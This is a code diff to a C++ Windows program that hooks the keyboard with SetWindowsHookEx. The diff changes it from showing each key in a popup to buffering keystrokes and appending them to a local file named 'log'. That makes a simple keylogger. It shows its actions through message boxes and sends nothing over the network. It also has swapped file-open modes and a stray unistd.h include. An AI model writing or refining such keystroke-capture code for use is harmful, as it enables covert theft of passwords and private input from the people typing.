@@ -1,4 +1,6 @@
 #include <iostream>
+#include <fstream>
+#include <unistd.h>	
 #include <Windows.h>
 #include <map>
 #include <stdlib.h>
@@ -6,6 +8,9 @@ using namespace std;
 
 HHOOK hhk; // variable to store the HANDLE to the hook. Must be desclared globally
 bool debug = false;
+std::ofstream logFile;
+std::string buffer = "";
+std::string fileName = "log";
 std::map<int, std::string> keyCodes = {
 	{8, "BACKSPACE"},
 	{9, "TAB"},
@@ -112,17 +117,28 @@ std::map<int, std::string> keyCodes = {
 	{222, "'"}
 };
 
+bool fileExist (const std::string& name) {
+	std::ifstream file(name.c_str());
+	return bool(file.good());
+}
+
 LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT keyboardStruct;
 	if (nCode >= 0){
 		if (wParam == WM_KEYDOWN) {
 			keyboardStruct = *((KBDLLHOOKSTRUCT*) lParam);
-			MessageBox(NULL, keyCodes[keyboardStruct.vkCode].c_str(), "Key Info", MB_ICONINFORMATION | MB_OK);
+			buffer += keyCodes[keyboardStruct.vkCode];
+			
+			if (buffer.length() > 100) {
+				logFile << buffer;
+				buffer = "";
+				MessageBox(NULL, "Written Buffer to File.", "Buffer Written", MB_ICONINFORMATION | MB_OK);
+			}
 			
 			if (debug) {
-				char buff[100];
-				sprintf(buff, "virtual key: %d\tscan code: %d", keyboardStruct.vkCode, keyboardStruct.scanCode);
-				MessageBox(NULL, buff, "Key Info", MB_ICONINFORMATION | MB_OK);
+				char debugBuff[125];
+				sprintf(debugBuff, "key: %s\tvirtual key: %d\tscan code: %d", keyCodes[keyboardStruct.vkCode].c_str(), keyboardStruct.vkCode, keyboardStruct.scanCode);
+				MessageBox(NULL, debugBuff, "Key Info", MB_ICONINFORMATION | MB_OK);
 			}
 
 			if (keyboardStruct.vkCode == 27) {
@@ -144,6 +160,15 @@ int main(int argc, char **argv) {
 		}
 	}
 	
+	if (!(fileExist (fileName))) {
+		MessageBox(NULL, "New File Created", "New File", MB_ICONINFORMATION | MB_OK);
+		logFile.open(fileName, std::ios_base::app);
+	}
+	else {
+		MessageBox(NULL, "Appended to file.", "Appending File", MB_ICONINFORMATION | MB_OK);
+		logFile.open(fileName, std::ios::out);
+	}
+	
 	hhk = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack,  GetModuleHandle(NULL), 0);
 	if (hhk != NULL) {
 		if (debug) cout << "Press any char on the key. A popup window will display key pressed. When done press esc to exit." << endl;
@@ -160,8 +185,9 @@ int main(int argc, char **argv) {
  			std::string message(messageBuffer, size);
  			LocalFree(messageBuffer);
  			cout << message << endl;
+ 			exit(1);
 		 }
- 		
+		 logFile.close();
 	}
 	else {
 		DWORD errorMessageID = ::GetLastError();
@@ -170,6 +196,7 @@ int main(int argc, char **argv) {
 		std::string message(messageBuffer, size);
 		LocalFree(messageBuffer);
 		cout << message << endl;
+		exit(1);
 	}
 	if (debug) cout << "Exiting program." << endl;
 	return 0;
